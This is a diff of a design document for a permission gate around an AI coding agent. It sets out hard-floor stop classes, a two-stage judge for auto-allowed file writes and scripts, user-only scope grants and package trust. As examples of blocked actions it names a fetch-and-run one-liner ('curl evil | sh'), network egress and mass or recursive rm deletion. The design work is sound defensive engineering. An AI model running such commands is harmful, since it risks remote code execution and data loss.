@@ -72,7 +72,7 @@ the full command + analysis + content and decides.
 | parse errors | unverifiable |
 | obscured command position (`$f`, `$( )` as the command) | cannot verify what runs |
 | network egress (command or URL) | exfiltration surface (Q2, resolved: hard for phase 1; a trusted-domains setting is the future opening) |
-| paths outside session base (bash `outsidePaths`, file `outsideDir`) | **scope grants are the user's call, never the judge's** (Q1, resolved) |
+| paths outside the **manual** bar (bash `outsidePaths`, file `outsideDir`; the bar is what manual mode auto-allows — D11) | **scope grants are the user's call, never the judge's** (Q1, re-confirmed D11) |
 | rm carve-out violations (non-explicit/outside/self-writes not cleaned up) | unchanged; the carve-out stays |
 | rm mass-deletion class (home/system dirs, ≥100 entries, bare glob) | unchanged, via the non-rm-dangerous filter |
 | non-rm dangerous reasons in rm commands | (fixed 2026-08-23, `4957afc`) |
@@ -89,10 +89,12 @@ the full command + analysis + content and decides.
   neighborhood")
 
 **What the judge gets in each case** (packet, `judge-prompt.ts`): the
-command is already capped at 4000 chars and carries the full heredoc body;
-script-file payloads already ride fenced. For inline scripts the body *is*
-the command text — no new extraction needed. For file operations the new
-content already rides in `JudgmentFileInput.content`.
+command rides in **full, untrimmed** (D11) and carries the full heredoc
+body; script-file payloads ride fenced, in full. For inline scripts the
+body *is* the command text — no new extraction needed. For file
+operations the new content already rides in `JudgmentFileInput.content`.
+Overflow is the existing judge-failure mode: the call fails → defer →
+prompt (D11: no caps, so a safe long write can no longer force a defer).
 
 ### D2. Two-stage judge, intent at stage 2
 
@@ -147,6 +149,10 @@ First-write UX is unchanged: prompt offers Always-for-dir; thereafter the
 dir is trusted but content is judged — full two-stage flow, same verdict
 policy as bash (Q7, resolved): one code path, and intent can clear the
 stateless judge's large-replacement defers.
+
+D11 extends D3 (see below): the probe generalizes to every content-bearing
+file-write auto-allow and, via the bash conversion in `gate()`, to granted
+script executions.
 
 ### D4. Denials go to the agent, not the user
 
@@ -271,8 +277,10 @@ registry access, and a lenient local judge is no backstop for that.
 /tmp is the conventional world-scratch area; `rm -f /tmp/probe.log` is the
 normal cleanup pattern. An rm target directly under `/tmp/` that is
 explicit (the existing bar: no globs/vars/tilde) and non-recursive passes
-the floor to the judge. Recursive (`rm -rf /tmp/x`), `/tmp` itself, and
-computed targets stay on the floor.
+the floor to the judge. Computed/glob targets stay on the floor. (D11:
+concrete recursive/bare `/tmp` rm moved with the bar — /tmp is
+config-allowed, i.e. in the manual bar — so it is judgeable like in-cwd
+recursive rm; the judge's deny rule gates mass deletion.)
 
 What did NOT change: outside-base reads stay user-only (Q1); MCP stays
 never-auto-allowed; the single `rm target not explicit ($d)` stop is by
@@ -343,8 +351,10 @@ keys (`npx tsc@5.0.0` → `tsc`); scoped names keep their scope
 stages — the floor's stop stands (never an auto-allow), but the final
 verdict is rendered in the fall-through prompt with an
 "advisory (floor stop stands)" note. The judge's read on the package is
-input for the user's decision, not authority over it. Other stop classes
-get no advisory verdict (a verdict on `curl evil | sh` is noise).
+input for the user's decision, not authority over it. D11 extends the
+advisory to the scope-class stops (outside base, unresolvable location).
+Danger-class stops (network egress, obscured, credentials, root scan) get
+no advisory verdict — a verdict on `curl evil | sh` is noise.
 
 **The grant**: the prompt's tier-1 offers `Trust: <pkg> (session)` (second
 confirm, like every Always). Trust = per bare package name, stored in the
@@ -356,6 +366,57 @@ covers the package across all fetchable forms (trust `tsc` → `npx tsc`,
 `Always: npx *` broader grant — same explicit-confirm bar, narrower blast
 radius. Trust does not cover unsafe shapes: pipes/redirects/subshells with
 them fail `canBeAutoAllowed` and still go to the judge.
+
+### D11. Re-alignment: the floor's bar is the MANUAL bar; the judge reviews all content-bearing auto-alls (2026-08-26)
+
+The 2026-08-26 grill re-confirmed the semantics D1/D3/D7/D8 were drifting
+from. Six decisions (implemented the same day; reverts fix (a) of
+`5ef1f0f`):
+
+1. **The floor's bar is the manual bar (Q1 re-confirmed).** "Outside
+   base" means *outside what manual mode auto-allows*: cwd + session
+   grants (the read check covers both sets) + config-allowed paths +
+   trusted scripts — the exact predicate of `getOutsideCwdPaths`, now
+   shared by the manual bar and the floor (concrete paths and
+   opaque/sentinel resolution alike). A location manual auto-allows is
+   not a scope violation: the judge reviews it. Only what manual would
+   prompt for (truly outside) stops — and the stop still flows to a
+   prompt offering the same Always options manual does, so the user can
+   grant the scope; later runs of the granted location are then judged,
+   not stopped. This reverts `5ef1f0f` (a), the session-base re-filter
+   that stopped `cat > /tmp/x`-class writes the judge had correctly
+   auto-allowed. Consequence accepted: concrete recursive/bare `/tmp` rm
+   is now judgeable (see D8).
+2. **The judge packet is untrimmed.** "In full, not trimmed" meant all
+   three: file content (8000-char cap removed), command text incl.
+   heredoc bodies (4000-char cap removed), script payloads (150-line/
+   64KB slice removed). Overflow is the existing judge-failure mode:
+   the call fails → defer → prompt. MCP args and the segment digest
+   keep their head-cuts — they are digests, not write content.
+3. **Clause A extended: the judge reviews ALL content-bearing manual
+   auto-allows.** Every file-write auto-allow (dir/file grant,
+   config-allowed, project-pi) converts to a judged prompt (the D3 probe
+   generalizes: `judgeDirGrants` → `judgeWriteAutoAllows`), and a bash
+   auto-allow whose analysis carries an extractable script payload
+   (granted interpreter execution) converts the same way. Reads and
+   payload-less commands are never judged. Judge OFF/INVALID → no
+   conversion (the manual auto-allow stands — dspa never adds a prompt
+   on its own; a runtime judge failure still falls toward the prompt).
+   Verdict policy unchanged (D2/D4): s1 approve+low, s2
+   approve+{low, med}; reject/defer → prompt with the verdict.
+4. **Advisory verdicts on scope-class floor stops.** Outside-base stops
+   (bash + file), unresolvable-location stops, and untrusted-package
+   stops (D10) run BOTH judge stages; the final verdict renders in the
+   prompt as advisory input — the floor's stop stands (never an
+   auto-allow). Danger-class stops stay bare (see D10).
+5. **The Trust option stays.** Grilled as possibly redundant vs Always —
+   it is not: Trust is per bare package across ALL fetchable forms
+   (npx/uvx/bun x/npm exec/pnpm dlx/yarn dlx/uv x) with version pins
+   stripped; an Always signature matches the exact form as typed; the
+   broader `Always: npx *` covers any package. All are deterministic
+   post-grant; none cover unsafe shapes.
+6. **The floor keeps**: unresolvable-location stops (now with advisory
+   verdict), full-filesystem scans, and rm targets outside the bar.
 
 ## 4. Phasing
 
@@ -385,12 +446,22 @@ class"). Suite 3229.
   forms stop on `untrusted package (…)` with the judge's verdict shown
   advisory in the prompt; a `Trust: <pkg> (session)` option grants
   deterministic auto-allow for that package). Suite 3288.
+- **Phase 3g — done** (2026-08-26): D11 (re-alignment — the floor's bar
+  is the manual bar; the judge packet is untrimmed; the judge reviews
+  all content-bearing manual auto-alls — file writes and granted script
+  executions; advisory verdicts on scope-class floor stops; reverts
+  `5ef1f0f` (a); log-inspect gains the resolution-mismatch audit check
+  and `dspa --reasons`). Suite 3404.
 
 ## 5. Open questions (grill order)
 
-1. **Q1 — RESOLVED: outside base stays on the hard floor.** Scope grants are
-   a user-only decision (Always-for-dir); the judge judges content inside
-   granted scope and can never grant scope itself.
+1. **Q1 — RE-CONFIRMED 2026-08-26 (D11): outside the *manual* bar stays on
+   the hard floor.** "Outside base" = outside what manual mode auto-allows
+   (cwd + grants + config-allowed + trusted scripts). Scope grants are a
+   user-only decision (Always-for-dir); the judge judges content inside
+   granted scope — including manual-bar locations — and can never grant
+   scope itself. An outside-base stop still prompts with the manual
+   Always options, so the user can grant the scope.
 2. **Q2 — RESOLVED: network egress stays on the hard floor for phase 1.**
    Intent doesn't de-risk a URL; the future opening is a trusted-domains
    setting (halter's `autoMode.environment`), revisit with stop-tag data.
